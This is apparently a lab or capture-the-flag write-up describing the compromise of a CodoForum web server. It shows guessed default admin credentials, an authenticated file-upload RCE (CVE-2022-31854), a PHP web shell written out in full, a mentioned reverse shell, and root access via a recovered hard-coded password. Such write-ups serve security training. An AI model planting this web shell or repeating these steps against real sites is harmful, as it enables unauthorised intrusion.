## Web Application - TCP 80
### Site

Visiting the site takes us to a forum-like website.

### Tech Stack

The website seems to be running `CodoForum` which is an advanced, best, and most powerful free PHP forum software.

![](../Attachments/codo_tech.png)

Upon research there seems to be multiple vulnerabilities for this software.

![](../Attachments/codo_vulns.png)

# Shell as www-data
## CVE-2022-31854

In our previous searchsploit image, we can see there is an [authenticated RCE](https://www.exploit-db.com/exploits/50978) vulnerability for Codoforum.

Since this is authenticated, I started to look for default credentials and none were found.

Reviewing the exploit script tells us that we are trying to authenticate via the admin portal at `/admin/?page=login`.

![](../Attachments/codo_admin-portal.png)

Finally, we found valid credentials, `admin:admin`, after manually testing common user/pass combinations.

![](../Attachments/codo_admin-dash.png)

Having all I need to run the exploit code, I went ahead and ran the script. Unfortunately, the script throws an error and hints at how to manually reproduce this exploit.

![](../Attachments/codo_exp-fail.png)

First, I find the upload functionality that the script mentions.

![](../Attachments/codo_upload-func.png)

Then I go ahead and write a quick PHP web shell script to upload:

```php
# wbshll.php
<?php
system($_GET['cmd']);
?>
```

Once we upload our file and save the changes, we see that it now says that the logo is `wbshll.php`

![](../Attachments/codo_upload-success.png)

Now the script says we can access this file using this URL:

```
http://192.168.235.23/sites/default/assets/img/attachments/[file.php]
```

We can see we now have RCE:

![](../Attachments/codo_RCE.png)

I write a quick bash one-liner reverse shell and submit via burp and get a reverse shell.

# Shell as root
## Hard-coded creds

Considering that this is a web server that has many files and directories, I use a tool that I wrote to scrape all these assets for keywords.

![](../Attachments/codo_creds.png)

I then try switching to the root user using `FatPanda123` and was able to get a root shell.

```bash
su root
```
